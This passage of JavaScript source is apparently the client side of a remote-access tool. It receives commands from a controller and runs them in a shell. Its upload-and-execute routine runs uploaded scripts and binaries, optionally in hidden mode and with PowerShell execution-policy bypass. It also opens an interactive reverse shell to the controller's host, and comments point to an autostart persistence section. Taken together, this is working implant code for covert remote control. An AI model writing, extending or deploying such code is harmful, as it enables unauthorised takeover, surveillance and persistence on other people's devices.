    } else if (/\s/.test(c)) {
      if (current || started) {
        tokens.push(current);
        current = '';
        started = false;
      }
    } else {
      current += c;
    }
    i += 1;
  }
  if (quote) throw new Error('No closing quotation');
  if (current || started) tokens.push(current);
  return tokens;
}

function expandUser(p) {
  if (p === '~') return os.homedir();
  if (p.startsWith('~/') || (IS_WINDOWS && p.startsWith('~\\'))) {
    return path.join(os.homedir(), p.slice(2));
  }
  return p;
}

function expandVars(text) {
  return text.replace(/\$([A-Za-z_][A-Za-z0-9_]*)|\$\{([^}]+)\}/g, (match, plain, braced) => {
    const name = plain || braced;
    if (Object.prototype.hasOwnProperty.call(process.env, name)) return process.env[name] || '';
    return match;
  });
}

function changeDir(command, currentDir) {
  const cmd = command.trim();
  const low = cmd.toLowerCase();
  if (low !== 'cd' && !low.startsWith('cd ')) return null;
  if (['&&', '||', ';', '|'].some((op) => cmd.includes(op))) return null;

  let target = cmd.slice(2).trim();
  if (IS_WINDOWS && target.toLowerCase().startsWith('/d ')) target = target.slice(3).trim();
  if (!IS_WINDOWS && target) {
    try {
      const parts = shlexSplit(target);
      if (parts.length === 1) target = parts[0];
    } catch {
      if (target.length >= 2 && target[0] === target[target.length - 1]
        && (target[0] === '"' || target[0] === "'")) target = target.slice(1, -1);
    }
  } else if (target.length >= 2 && target[0] === target[target.length - 1]
    && (target[0] === '"' || target[0] === "'")) {
    target = target.slice(1, -1);
  }

  if (target === '') return { dir: currentDir, output: currentDir };

  target = expandUser(expandVars(target));
  if (target === '-') {
    if (PREV_DIR && isDirectory(PREV_DIR)) {
      const newDir = PREV_DIR;
      PREV_DIR = currentDir;
      return { dir: newDir, output: newDir };
    }
    return { dir: currentDir, output: 'cd: OLDPWD not set' };
  }
  let newDir = path.isAbsolute(target) ? target : path.join(currentDir, target);
  newDir = path.normalize(newDir);
  if (isDirectory(newDir)) {
    PREV_DIR = currentDir;
    return { dir: newDir, output: null };
  }
  if (anyExists(newDir)) return { dir: currentDir, output: 'cd: ' + target + ': Not a directory' };
  return { dir: currentDir, output: 'cd: ' + target + ': No such file or directory' };
}

function isDirectory(p) {
  try { return fs.statSync(p).isDirectory(); } catch { return false; }
}

// ---------------------------------------------------------------------------
// Command execution (mirrors run_command + process management)
// ---------------------------------------------------------------------------
function signalNumber(name) {
  const table = (os.constants && os.constants.signals) || {};
  return table[name] || 0;
}

function killOrphanGroup(pid) {
  if (IS_WINDOWS || !pid) return;
  for (const [sig, pause] of [['SIGTERM', 50], ['SIGKILL', 0]]) {
    try { process.kill(-pid, sig); } catch { /* ignore */ }
    signalSession(pid, sig);
    if (pause) { /* the pause below mirrors the Python grace period */ }
  }
}

function signalSession(sessionId, sig) {
  if (IS_WINDOWS || !sessionId) return false;
  if (process.platform === 'linux' && anyExists('/proc')) {
    let signaled = false;
    let entries = [];
    try { entries = fs.readdirSync('/proc'); } catch { entries = []; }
    for (const entry of entries) {
      if (!/^\d+$/.test(entry)) continue;
      try {
        const data = fs.readFileSync('/proc/' + entry + '/stat', 'utf8');
        const close = data.lastIndexOf(')');
        if (close < 0) continue;
        const fields = data.slice(close + 2).split(/\s+/);
        if (fields.length < 4 || parseInt(fields[3], 10) !== sessionId) continue;
        process.kill(parseInt(entry, 10), sig);
        signaled = true;
      } catch { /* ignore */ }
    }
    return signaled;
  }
  if (IS_DARWIN) {
    try {
      const out = execFileSync('ps', ['-axo', 'pid=,sess='], { timeout: 5000 });
      for (const line of out.toString('ascii').split(/\r?\n/)) {
        const parts = line.trim().split(/\s+/);
        if (parts.length >= 2 && /^\d+$/.test(parts[1]) && parseInt(parts[1], 10) === sessionId) {
          try { process.kill(parseInt(parts[0], 10), sig); } catch { /* ignore */ }
        }
      }
    } catch { /* ignore */ }
  }
  return false;
}

function childGone(child) {
  return child.exitCode !== null || child.signalCode !== null;
}

async function taskkillTree(pid) {
  return new Promise((resolve) => {
    let settled = false;
    let killer = null;
    let timer = null;
    const finish = (ok) => {
      if (settled) return;
      settled = true;
      if (timer) clearTimeout(timer);
      resolve(ok);
    };
    try {
      killer = require('child_process').spawn('taskkill',
        ['/F', '/T', '/PID', String(pid)],
        { stdio: 'ignore', windowsHide: true });
    } catch {
      finish(false);
      return;
    }
    timer = setTimeout(() => {
      try { killer.kill('SIGKILL'); } catch { /* ignore */ }
      finish(false);
    }, 10000);
    killer.once('error', () => finish(false));
    killer.once('exit', (code) => finish(code === 0));
  });
}

const KILL_TASKS = new WeakMap();

function killProcess(child) {
  if (!child) return Promise.resolve();
  const running = KILL_TASKS.get(child);
  if (running) return running;
  const task = (async () => {
    if (childGone(child)) {
      // The shell is gone, but `cmd &` children can still be alive and hold
      // the output pipe. A cancel in that window must clean them up too.
      killOrphanGroup(child.pid);
      return;
    }
    if (IS_WINDOWS) {
      let stopped = false;
      try { stopped = await taskkillTree(child.pid); } catch { stopped = false; }
      if (stopped) return;                     // taskkill really stopped the tree
      // taskkill can fail (access denied, a process that already changed
      // state, ...): kill the direct child as the fallback.
      try { child.kill('SIGKILL'); } catch { /* ignore */ }
      return;
    }
    let group = null;
    try { group = process.getpgid(child.pid); } catch { group = null; }
    const signal = (sig) => {
      try {
        if (group != null) process.kill(-group, sig);
        else child.kill(sig);
        return true;
      } catch {
        return false;
      }
    };
    if (!signal('SIGTERM')) return;
    // Wait without blocking the event loop: timers, tunnels and the poll
    // connect loop must keep running while the process shuts down.
    for (let waited = 0; waited < 1000 && !childGone(child); waited += 50) {
      await sleep(50);
    }
    if (childGone(child)) return;
    if (!signal('SIGKILL')) return;
    for (let waited = 0; waited < 2000 && !childGone(child); waited += 50) {
      await sleep(50);
    }
  })();
  KILL_TASKS.set(child, task);
  task.then(
    () => { if (KILL_TASKS.get(child) === task) KILL_TASKS.delete(child); },
    () => { if (KILL_TASKS.get(child) === task) KILL_TASKS.delete(child); },
  );
  return task;
}

function cleanupLeftoverGroup(pid) {
  if (IS_WINDOWS || !pid) return;
  try { process.kill(-pid, 'SIGHUP'); } catch { /* ignore */ }
}

function decodeCommandOutput(data) {
  if (!data || !data.length) return '';
  return data.toString('utf8');
}

// A single-reader poll over the control connection with a short deadline.
// Returns {kind:'msg', msg}, {kind:'closed'}, or {kind:'timeout'}.  The caller
// must keep exactly one outstanding call: canceling an in-flight read would
// desynchronize the byte stream.
function recvMsgPoll(conn, ms) {
  return recvMsg(conn, now() + ms / 1000).then((msg) => {
    if (msg === null) return conn.queue.closed ? { kind: 'closed' } : { kind: 'timeout' };
    return { kind: 'msg', msg };
  });
}

async function runCommand(conn, command, currentDir, reqId = null) {
  let child;
  const spawnOpts = {
    cwd: currentDir,
    windowsHide: true,
    stdio: ['ignore', 'pipe', 'pipe'],   // stderr is merged into the same collector
    env: process.env,
  };
  if (!IS_WINDOWS) spawnOpts.detached = true;
  try {
    child = require('child_process').spawn(command, [], { ...spawnOpts, shell: true });
  } catch (e) {
    return { text: errorText(e), stop: false, exitCode: 127 };
  }

  const chunks = [];
  let size = 0;
  let lastDataAt = now();
  let truncated = false;
  let stopReader = false;
  let stdoutClosed = false;
  let stderrClosed = false;
  let readerDone = false;

  const collect = (data) => {
    lastDataAt = now();
    if (stopReader) return;
    if (size < MAX_OUTPUT) {
      chunks.push(data);
      size += data.length;
    } else if (!truncated) {
      truncated = true;
    }
  };

  if (child.stdout) {
    child.stdout.on('data', collect);
    child.stdout.on('close', () => { stdoutClosed = true; readerDone = stderrClosed; });
    child.stdout.on('error', () => { stdoutClosed = true; readerDone = stderrClosed; });
  } else {
    stdoutClosed = true;
  }
  if (child.stderr) {
    child.stderr.on('data', collect);
    child.stderr.on('close', () => { stderrClosed = true; readerDone = stdoutClosed; });
    child.stderr.on('error', () => { stderrClosed = true; readerDone = stdoutClosed; });
  } else {
    stderrClosed = true;
  }
  if (!child.stdout && !child.stderr) readerDone = true;

  let killed = false;
  let stop = false;
  let disconnected = false;
  let killWhy = 'Ctrl+Z';
  let cleanExit = false;
  let exitCode = null;
  let exited = false;
  child.on('exit', (code, signal) => {
    exited = true;
    exitCode = (code !== null && code !== undefined) ? code
      : (signal ? -signalNumber(signal) : null);
  });

  let pending = null;
  try {
    for (;;) {
      if (!pending) pending = recvMsgPoll(conn, 500);
      const winner = await Promise.race([
        pending,
        exited ? Promise.resolve({ kind: 'exit' }) : new Promise((resolve) => child.once('exit', () => resolve({ kind: 'exit' }))),
        sleep(150).then(() => ({ kind: 'tick' })),
      ]);

      if (winner.kind === 'exit') {
        // Collect the tail: wait for the pipe to close, 0.5 s of silence after
        // output, or at most 2 s after the shell exited (mirrors client.py).
        const exitWaitStart = now();
        for (;;) {
          if (readerDone || stdoutClosed) break;
          if (now() - lastDataAt > 0.5) break;
          if (now() - exitWaitStart > 2.0) break;
          await sleep(50);
        }
        if (pending) {
          const late = await pending;
          pending = null;
          if (late.kind === 'msg') {
            const effect = handleCommandControl(conn, late.msg, reqId, currentDir, {
              kill: (why) => { void killProcess(child); if (why !== 'exit') { killed = true; killWhy = why; } },
              stop: () => { stop = true; },
            });
            if (effect === 'stop') { stop = true; break; }
          } else if (late.kind === 'closed') {
            disconnected = true;
          }
        }
        cleanExit = true;
        break;
      }

      if (winner.kind === 'closed') {
        void killProcess(child);
        disconnected = true;
        pending = null;
        break;
      }

      if (winner.kind === 'timeout' || winner.kind === 'tick') {
        if (winner.kind === 'timeout') pending = null;
        continue;
      }

      // winner.kind === 'msg'
      pending = null;
      const msg = winner.msg;
      const effect = handleCommandControl(conn, msg, reqId, currentDir, {
        kill: (why) => { void killProcess(child); if (why !== 'exit') { killed = true; killWhy = why; } },
        stop: () => { stop = true; },
      });
      if (effect === 'stop') { stop = true; break; }
    }
  } finally {
    if (cleanExit && !(killed || disconnected || stop)) cleanupLeftoverGroup(child.pid);
    stopReader = true;
    for (const stream of [child.stdout, child.stderr]) {
      if (!stream) continue;
      try { stream.destroy(); } catch { /* ignore */ }
    }
  }

  let text = decodeCommandOutput(Buffer.concat(chunks));
  const notes = [];
  if (killed) notes.push('[client] command stopped by the controller (' + killWhy + ')');
  if (disconnected) notes.push('[client] controller disconnected - command stopped');
  if (truncated) notes.push('[client] output cut off after ' + String(MAX_OUTPUT / (1024 * 1024)) + ' MB (the command kept running)');
  if (notes.length) {
    if (text && !text.endsWith('\n')) text += '\n';
    text += notes.join('\n');
  }
  if (killed || disconnected || stop) exitCode = null;
  return { text, stop, exitCode };
}

// Handle one control message received while a command runs.  Returns null for
// "handled" or 'stop' when the controller asked to exit.
function handleCommandControl(conn, msg, reqId, currentDir, opts) {
  const mtype = msg.type;
  if (mtype === 'cancel') {
    const target = msg.id === undefined ? null : msg.id;
    const why = msg.why || 'Ctrl+Z';
    if (target == null || target === reqId) {
      // Ctrl+Z / 'stop' on the controller: it names the request to stop.
      opts.kill(why);
    } else {
      markCanceled(target, why);   // a queued request: skip it later
      const key = incomingKey(target);
      const state = key != null ? INCOMING_TRANSFERS.get(key) : null;
      if (state) state.abort({ reason: why });
      outgoingCancel(target);
    }
    return null;
  }
  if (mtype === 'cmd_kill') {       // older controller: stop this one
    opts.kill('Ctrl+Z');
    return null;
  }
  if (mtype === 'screenshare_stop') {
    stopStream(0.5);               // a share can run next to a command
    return null;
  }
  if (mtype === 'exit') {
    opts.kill('exit');
    opts.stop();
    return 'stop';
  }
  if (typeof mtype === 'string' && mtype.startsWith('transfer_')) {
    // A background upload may run while this command does.  Feed its stream
    // to the receive state instead of deferring chunks.
    handleTransferMessage(conn, msg, msg.id, currentDir);
    return null;
  }
  if (mtype === 'download') {
    // Let a background download start now instead of waiting for a long
    // command; its worker only writes to the socket.
    serveDownloadRequest(conn, msg, msg.id, currentDir);
    return null;
  }
  // Answer it once this command is done instead of dropping it; the queue is
  // bounded so a flooding controller cannot grow it without limit.
  const deferredId = msg.id;
  if (!deferMessage(msg)) {
    if (deferredId != null && validReqId(deferredId)) {
      sendMsg(conn, { type: 'error', id: deferredId, data: 'client busy: request queue is full' }).catch(() => {});
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// Subsystem placeholders.  Each is replaced by the full implementation in the
// sections that follow; declarations here keep the main loop honest.
// ---------------------------------------------------------------------------
const INCOMING_TRANSFERS = new Map();
const OUTGOING_TRANSFERS = new Map();
let SHELL_STATE = null;

function incomingKey(reqId) { return reqId == null ? null : String(reqId); }

// ---------------------------------------------------------------------------
// upex: upload-and-execute (mirrors run_upex / Upex.cs)
//
// The controller uploads the app (and optionally an auto.<type> launcher) with
// the normal streamed transfer protocol, then sends one "upex" request.  All
// OS-specific command construction, compiler fallback and hidden-mode handling
// stays here, where the real platform is known.
//
// New-Feature-Add.txt specifies literal command names (python, node, dotnet,
// gcc, ...).  Never probe PATH here: run the documented command and use the
// documented fallback only after that command actually fails.
// ---------------------------------------------------------------------------
const UPEX_APP_TYPES = new Set([
  'py', 'c', 'cpp', 'cs', 'js', 'ts', 'swift', 'sh', 'bat',
  'ps1', 'vbs', 'exe', 'elf', 'macho', 'bin',
]);
const UPEX_AUTO_TYPES = new Set(['py', 'cs', 'js', 'sh']);
const UPEX_EXTENSIONS = {
  '.py': 'py', '.pyw': 'py',
  '.c': 'c',
  '.cc': 'cpp', '.cpp': 'cpp', '.cxx': 'cpp', '.c++': 'cpp',
  '.cs': 'cs',
  '.js': 'js', '.mjs': 'js', '.cjs': 'js',
  '.ts': 'ts',
  '.swift': 'swift',
  '.sh': 'sh', '.bash': 'sh',
  '.bat': 'bat', '.cmd': 'bat',
  '.ps1': 'ps1',
  '.vbs': 'vbs',
  '.exe': 'exe',
  '.elf': 'elf',
  '.macho': 'macho',
};

function upexSimpleName(value) {
  if (typeof value !== 'string' || !value) return null;
  const name = value.replace(/\\/g, '/');
  if (name === '.' || name === '..' || name.includes('/') || name.includes('\x00')) return null;
  return name;
}

function upexTypeFromName(name) {
  const ext = path.extname(String(name || '')).toLowerCase();
  return UPEX_EXTENSIONS[ext] || '';
}

function upexReadHead(filePath) {
  let fd = null;
  try {
    fd = fs.openSync(filePath, 'r');
    const buf = Buffer.alloc(160);
    const n = fs.readSync(fd, buf, 0, 160, 0);
    return buf.subarray(0, n);
  } catch {
    return Buffer.alloc(0);
  } finally {
    if (fd !== null) { try { fs.closeSync(fd); } catch { /* ignore */ } }
  }
}

function upexDetectType(filePath, hint) {
  const normalized = String(hint || '').toLowerCase();
  if (UPEX_APP_TYPES.has(normalized)) return normalized;
  const byName = upexTypeFromName(path.basename(filePath));
  if (byName) return byName;
  const head = upexReadHead(filePath);
  if (head.length >= 4 && head[0] === 0x7f && head[1] === 0x45
    && head[2] === 0x4c && head[3] === 0x46) {
    return 'elf';
  }
  if (head.length >= 4) {
    const magic = head.readUInt32BE(0);
    if (magic === 0xfeedface || magic === 0xcefaedfe || magic === 0xfeedfacf
      || magic === 0xcffaedfe || magic === 0xcafebabe || magic === 0xbebafeca) {
      return 'macho';
    }
  }
  if (head.length >= 2 && head[0] === 0x4d && head[1] === 0x5a) return 'exe';
  if (head.length >= 2 && head[0] === 0x23 && head[1] === 0x21) {
    const end = head.indexOf(0x0a);
    const line = head.subarray(0, end < 0 ? head.length : end).toString('utf8').toLowerCase();
    if (line.includes('python')) return 'py';
    if (line.includes('node')) return 'js';
    if (line.includes('sh')) return 'sh';
  }
  // A bare executable is the documented extensionless shell/ELF/Mach-O case
  // on Unix.  Windows needs an explicit .exe (or a file association).
  return IS_WINDOWS ? 'unknown' : 'bin';
}

function upexAttempt(label, command, run = '') {
  return { label, command, run };
}

function upexAutoCommand(auto, app, autoType, hidden) {
  const type = String(autoType || upexTypeFromName(auto)).toLowerCase();
  if (!UPEX_AUTO_TYPES.has(type)) return { attempts: [], error: 'auto mode supports only py, cs, js and sh' };
  const flag = hidden ? ' --hidden' : '';
  if (type === 'py') {
    // Windows uses its Python launcher; Unix uses the literal python command
    // from the auto.py section.  No quotes are added.
    const launcher = IS_WINDOWS ? 'py' : 'python';
    return { attempts: [upexAttempt(launcher, launcher + ' ' + auto + ' ' + app + flag)], error: '' };
  }
  if (type === 'cs') {
    // The '--' belongs to dotnet and is used only for the C# launcher.
    return { attempts: [upexAttempt('dotnet', 'dotnet run ' + auto + ' -- ' + app + flag)], error: '' };
  }
  if (type === 'js') {
    return { attempts: [upexAttempt('node', 'node ' + auto + ' ' + app + flag)], error: '' };
  }
  // POSIX shell launcher: bash first, then sh, then the executable bit.
  // These are attempted by execution failure, never by a PATH lookup.
  const attempts = [
    upexAttempt('bash', 'bash ' + auto + ' ' + app + flag),
    upexAttempt('sh', 'sh ' + auto + ' ' + app + flag),
  ];
  if (!IS_WINDOWS) {
    attempts.push(upexAttempt('chmod', 'chmod +x ' + auto + ' && ./' + auto + ' ' + app + flag));
  }
  return { attempts, error: '' };
}

function upexCompilerCandidates(app, appType) {
  const windows = IS_WINDOWS;
  const mac = isMacOS();
  const android = isAndroid();
  const ios = isIOS();
  const run = windows ? '.\\app.exe' : './app';
  if (appType === 'c') {
    if (windows) {
      return [upexAttempt('cl', 'cl ' + app, run),
        upexAttempt('gcc', 'gcc ' + app + ' -o app.exe', run)];
    }
    if (android) {
      return [upexAttempt('gcc', 'gcc ' + app + ' -o app', run),
        upexAttempt('clang', 'clang ' + app + ' -o app', run)];
    }
    if (mac || ios) {
      return [upexAttempt('clang', 'clang ' + app + ' -o app', run),
        upexAttempt('gcc', 'gcc ' + app + ' -o app', run)];
    }
    return [upexAttempt('gcc', 'gcc ' + app + ' -o app', run)];
  }
  if (appType === 'cpp') {
    if (windows) {
      return [upexAttempt('cl', 'cl /EHsc ' + app, run),
        upexAttempt('g++', 'g++ ' + app + ' -o app.exe', run)];
    }
    if (android) {
      return [upexAttempt('g++', 'g++ ' + app + ' -o app', run),
        upexAttempt('clang++', 'clang++ ' + app + ' -o app', run)];
    }
    if (mac || ios) {
      return [upexAttempt('clang++', 'clang++ ' + app + ' -o app', run)];
    }
    return [upexAttempt('g++', 'g++ ' + app + ' -o app', run)];
  }
  return [];
}

function upexAppPlan(app, appType, hidden) {
  const type = String(appType || upexTypeFromName(app)).toLowerCase();
  const windows = IS_WINDOWS;
  const mac = isMacOS();
  const ios = isIOS();
  if (hidden) return { attempts: null, error: 'hidden mode is only available with an auto launcher' };
  if (type === 'py') {
    const launcher = windows ? 'py' : 'python3';
    return { attempts: [upexAttempt(launcher, launcher + ' ' + app)], error: '' };
  }
  if (type === 'js') {
    return { attempts: [upexAttempt('node', 'node ' + app)], error: '' };
  }
  if (type === 'cs') {
    // dotnet first; csc is reached only after dotnet actually fails.
    const run = windows ? '.\\app.exe' : './app.exe';
    return {
      attempts: [
        upexAttempt('dotnet', 'dotnet run --file ' + app),
        upexAttempt('csc', 'csc ' + app, run),
      ],
      error: '',
    };
  }
  if (type === 'c' || type === 'cpp') {
    const attempts = upexCompilerCandidates(app, type);
    if (!attempts.length) {
      return { attempts: null, error: 'unsupported ' + type.toUpperCase() + ' compiler' };
    }
    return { attempts, error: '' };
  }
  if (type === 'swift') {
    const output = windows ? 'app.exe' : 'app';
    const run = windows ? '.\\app.exe' : './app';
    return {
      attempts: [
        upexAttempt('swift', 'swift ' + app),
        upexAttempt('swiftc', 'swiftc ' + app + ' -o ' + output, run),
      ],
      error: '',
    };
  }
  if (type === 'sh') {
    if (windows) {
      // Not part of the Windows matrix, but keep the existing support without
      // probing: bash, then sh, literally.
      return {
        attempts: [upexAttempt('bash', 'bash ' + app), upexAttempt('sh', 'sh ' + app)],
        error: '',
      };
    }
    return { attempts: [upexAttempt('chmod', 'chmod +x ' + app + ' && ./' + app)], error: '' };
  }
  if (type === 'bat') {
    if (!windows) return { attempts: null, error: '.bat files run on Windows only' };
    return { attempts: [upexAttempt('cmd', '.\\' + app)], error: '' };
  }
  if (type === 'ps1') {
    if (!windows) return { attempts: null, error: '.ps1 files run on Windows only' };
    // Set-ExecutionPolicy is scoped to this PowerShell process, so it must
    // run in the same invocation as the uploaded script.  Upex names are
    // single basenames without spaces; this matches New-Feature-Add.txt and
    // avoids cmd.exe quoting hazards.
    return {
      attempts: [upexAttempt('powershell',
        'powershell -ExecutionPolicy Bypass -File  ' + app)],
      error: '',
    };
  }
  if (type === 'vbs') {
    if (!windows) return { attempts: null, error: '.vbs files run on Windows only' };
    return { attempts: [upexAttempt('cscript', 'cscript.exe .\\' + app)], error: '' };
  }
  if (type === 'exe') {
    if (!windows) return { attempts: null, error: '.exe files run on Windows only' };
    return { attempts: [upexAttempt('cmd', '.\\' + app)], error: '' };
  }
  if (type === 'elf') {
    if (windows || mac || ios) return { attempts: null, error: '.elf files run on Linux/Android only' };
    return { attempts: [upexAttempt('chmod', 'chmod +x ' + app + ' && ./' + app)], error: '' };
  }
  if (type === 'macho') {
    if (!mac && !ios) return { attempts: null, error: '.macho files run on macOS/iOS only' };
    return { attempts: [upexAttempt('chmod', 'chmod +x ' + app + ' && ./' + app)], error: '' };
  }
  if (type === 'bin') {
    if (windows) {
      return {
        attempts: null,
        error: 'an extensionless executable needs Linux/macOS; use app.exe on Windows',
      };
    }
    return { attempts: [upexAttempt('chmod', 'chmod +x ' + app + ' && ./' + app)], error: '' };
  }
  if (type === 'ts') {
    return {
      attempts: null,
      error: 'TypeScript needs an auto launcher; use "upex auto.py app.ts", '
        + 'auto.cs, auto.js or auto.sh',
    };
  }
  return { attempts: null, error: 'unsupported app type' };
}

function upexAppend(parts, text) {
  const trimmed = String(text || '').trim();
  if (trimmed) parts.push(trimmed);
}

// Try commands in order; stop at the first success.  A successful compile
// attempt with a run command immediately runs that binary.  A failed command
// advances to the next documented alternative; PATH is never checked first.
async function upexExecuteAttempts(conn, reqId, currentDir, attempts) {
  const parts = [];
  let lastCode = null;
  for (let index = 0; index < attempts.length; index++) {
    const attempt = attempts[index];
    const result = await runCommand(conn, attempt.command, currentDir, reqId);
    upexAppend(parts, result.text);
    if (result.stop || result.exitCode === null || result.exitCode === undefined) {
      return { text: parts.join('\n'), stop: !!result.stop, exitCode: result.exitCode };
    }
    lastCode = result.exitCode;
    if (result.exitCode === 0) {
      if (!attempt.run) return { text: parts.join('\n'), stop: false, exitCode: 0 };
      const run = await runCommand(conn, attempt.run, currentDir, reqId);
      upexAppend(parts, run.text);
      return { text: parts.join('\n'), stop: !!run.stop, exitCode: run.exitCode };
    }
    if (index + 1 < attempts.length) {
      parts.push('[upex] ' + attempt.label + ' failed (exit ' + result.exitCode
        + '); trying the next option');
    }
  }
  if (!parts.length) parts.push('[upex] no command could run the app');
  return { text: parts.join('\n'), stop: false, exitCode: lastCode };
}

async function runUpex(conn, msg, currentDir, reqId = null) {
  const app = upexSimpleName(msg.app);
  if (!app) return { text: 'upex: unsafe or missing app filename', stop: false, exitCode: 1 };
  const appPath = path.join(currentDir, app);
  if (!isFileRegular(appPath)) {
    return { text: 'upex: file not found: ' + app, stop: false, exitCode: 1 };
  }
  const appType = upexDetectType(appPath, msg.app_type);
  if (!UPEX_APP_TYPES.has(appType)) {
    return { text: 'upex: unsupported app type for ' + app, stop: false, exitCode: 1 };
  }

  let auto = msg.auto;
  const hidden = !!msg.hidden;
  if (auto) {
    auto = upexSimpleName(auto);
    if (!auto) return { text: 'upex: unsafe or missing auto filename', stop: false, exitCode: 1 };
    const autoPath = path.join(currentDir, auto);
    if (!isFileRegular(autoPath)) {
      return { text: 'upex: auto file not found: ' + auto, stop: false, exitCode: 1 };
    }
    const autoType = String(msg.auto_type || upexTypeFromName(auto)).toLowerCase();
    const autoPlan = upexAutoCommand(auto, app, autoType, hidden);
    if (autoPlan.error) return { text: 'upex: ' + autoPlan.error, stop: false, exitCode: 1 };
    const result = await upexExecuteAttempts(conn, reqId, currentDir, autoPlan.attempts);
    let text = result.text;
    if (result.exitCode !== null && result.exitCode !== undefined && result.exitCode !== 0) {
      const note = '[upex] auto launcher exited with status ' + result.exitCode;
      text = text.trim() ? text.trimEnd() + '\n' + note : note;
    }
    return { text, stop: !!result.stop, exitCode: result.exitCode };
  }

  if (hidden) {
    return { text: 'upex: --hidden is only available with an auto launcher', stop: false, exitCode: 1 };
  }
  const plan = upexAppPlan(app, appType, hidden);
  if (plan.error) return { text: 'upex: ' + plan.error, stop: false, exitCode: 1 };
  return upexExecuteAttempts(conn, reqId, currentDir, plan.attempts);
}

function isFileRegular(target) {
  try { return fs.statSync(target).isFile(); } catch { return false; }
}

// installAutostart / removeAutostart live in the persistence section below
// (systemd, LaunchAgent, Termux:Boot, Windows task).

// ---------------------------------------------------------------------------
// Interactive shell (mirrors start_interactive_shell / _shell_unix)
//
// Node has no built-in PTY, so the Unix implementation drives script(1),
// which allocates a real PTY for the interactive shell.  When script(1) is
// unavailable (and always on Windows, which has no portable PTY in pure
// Node), a line-oriented pipe fallback keeps the shell usable.
// ---------------------------------------------------------------------------
let SHELL_BUSY = false;
let SHELL_CANCEL = false;
let SHELL_CONN = null;
let SHELL_CHILD = null;

function shellChildEnv() {
  const env = { ...process.env };
  env.PYTHONUNBUFFERED = '1';
  if (!env.PYTHONIOENCODING) env.PYTHONIOENCODING = 'utf-8';
  env.TERM = 'dumb';
  delete env.COLORTERM;
  return env;
}

function shellPath() {
  if (isAndroid()) return which('sh') || '/system/bin/sh';
  let shell = process.env.SHELL || '';
  if (!shell) shell = '/bin/bash';
  if (!anyExists(shell)) shell = anyExists('/bin/bash') ? '/bin/bash' : '/bin/sh';
  return shell;
}

function shSingleQuote(value) {
  return "'" + String(value).replace(/'/g, "'\\''") + "'";
}

async function sendShellOutput(conn, data) {
  if (!data || !data.length) return true;
  try {
    await conn.write(data);
    return true;
  } catch {
    return false;
  }
}

function stopShell() {
  const active = SHELL_BUSY || SHELL_CONN !== null;
  SHELL_CANCEL = true;
  if (!active) return false;
  const conn = SHELL_CONN;
  if (conn) { try { conn.close(); } catch { /* ignore */ } }
  const child = SHELL_CHILD;
  if (child) killProcess(child).catch(() => { /* ignore */ });
  return true;
}

function waitDrain(stream, timeoutMs) {
  return new Promise((resolve) => {
    let done = false;
    const onDrain = () => { if (!done) { done = true; clearTimeout(timer); resolve(true); } };
    stream.once('drain', onDrain);
    const timer = setTimeout(() => {
      if (!done) { done = true; stream.removeListener('drain', onDrain); resolve(false); }
    }, timeoutMs);
    if (timer.unref) timer.unref();
  });
}

async function connectShellChannel(host, port, scheme, token) {
  const deadline = now() + SHELL_CONNECT_TIMEOUT;
  let lastError = null;
  for (;;) {
    if (SHELL_CANCEL) throw new Error('shell cancelled');
    try {
      const opened = await openControllerConnection(host, port, scheme, 'shell', token);
      if (SHELL_CANCEL) {
        try { opened.conn.close(); } catch { /* ignore */ }
        throw new Error('shell cancelled');
      }
      return opened.conn;
    } catch (e) {
      lastError = e;
      if (SHELL_CANCEL) throw new Error('shell cancelled');
      if (now() >= deadline) {
        throw new Error('could not open the shell channel: ' + errorText(lastError));
      }
      await sleep(250);
    }
  }
}

function startInteractiveShell(controlConn, host, port, scheme, token, reqId) {
  if (SHELL_BUSY) {
    sendMsg(controlConn, {
      type: 'error', id: reqId,
      data: 'an interactive shell is already running',
    }).catch(() => {});
    return;
  }
  SHELL_BUSY = true;
  SHELL_CANCEL = false;
  const task = (async () => {
    let conn = null;
    try {
      conn = await connectShellChannel(host, port, scheme, token);
      SHELL_CONN = conn;
      let rows;
      let cols;
      try {
        const header = await conn.queue.readExact(4, { deadline: now() + SHELL_HANDSHAKE_TIMEOUT });
        if (!header) throw new Error('peer closed during handshake');
        rows = header.readUInt16BE(0);
        cols = header.readUInt16BE(2);
      } catch (e) {
        if (!SHELL_CANCEL) log('[!] shell: handshake failed:', errorText(e));
        return;
      }
      if (SHELL_CANCEL) return;
      if (rows <= 0 || cols <= 0) { rows = 24; cols = 80; }
      log('[+] Interactive shell session started (' + rows + 'x' + cols + ').');
      if (IS_WINDOWS) await shellWindows(conn, rows, cols);
      else await shellUnix(conn, rows, cols);
      log('[+] Interactive shell session ended.');
    } catch (e) {
      if (!SHELL_CANCEL) log('[!] shell session error:', errorText(e));
    } finally {
      if (conn) {
        try { conn.close(); } catch { /* ignore */ }
      }
      if (SHELL_CONN === conn) SHELL_CONN = null;
      if (SHELL_CHILD) {
        try { await killProcess(SHELL_CHILD); } catch { /* ignore */ }
        SHELL_CHILD = null;
      }
      SHELL_BUSY = false;
    }
  })();
  task.catch(() => {});
}

// Bridge one spawned child (script(1) PTY or a plain pipe shell) to the
// controller channel.  mode='pty' forwards raw bytes both ways;
// mode='pipe' renders input locally and submits whole lines.
async function bridgeShell(conn, child, mode, rows, cols) {
  SHELL_CHILD = child;
  let finished = false;
  let sendBroken = false;
  let outputChain = Promise.resolve();

  const enqueueOutput = (data) => {
    if (!data || !data.length || sendBroken) return;
    outputChain = outputChain.then(async () => {
      if (sendBroken) return;
      const ok = await sendShellOutput(conn, data);
      if (!ok) sendBroken = true;
    });
  };

  if (child.stdout) child.stdout.on('data', enqueueOutput);
  if (child.stderr) child.stderr.on('data', enqueueOutput);
  child.stdin.on('error', () => { /* the shell closed its stdin; exit handles it */ });

  const finishedPromise = new Promise((resolve) => {
    const finish = () => {
      if (finished) return;
      finished = true;
      clearInterval(watch);
      resolve();
    };
    child.on('exit', () => setTimeout(finish, 120));
    child.on('close', finish);
    child.on('error', () => finish());
    const watch = setInterval(() => {
      if (conn.queue.closed || conn.closed || sendBroken) finish();
    }, 150);
    if (watch.unref) watch.unref();
  });

  if (mode === 'pty') {
    // Raw byte bridge: controller -> PTY master (child stdin).
    (async () => {
      for (;;) {
        if (finished || SHELL_CANCEL) return;
        const piece = await conn.queue.readSome(65536, { deadline: now() + 0.2 });
        if (piece === null) {
          if (conn.queue.closed || finished) return;
          continue;
        }
        if (!piece.length) continue;
        if (!child.stdin || child.stdin.destroyed) return;
        const ok = child.stdin.write(piece);
        if (!ok) {
          const drained = await waitDrain(child.stdin, 5000);
          if (!drained) {
            await sendShellOutput(conn,
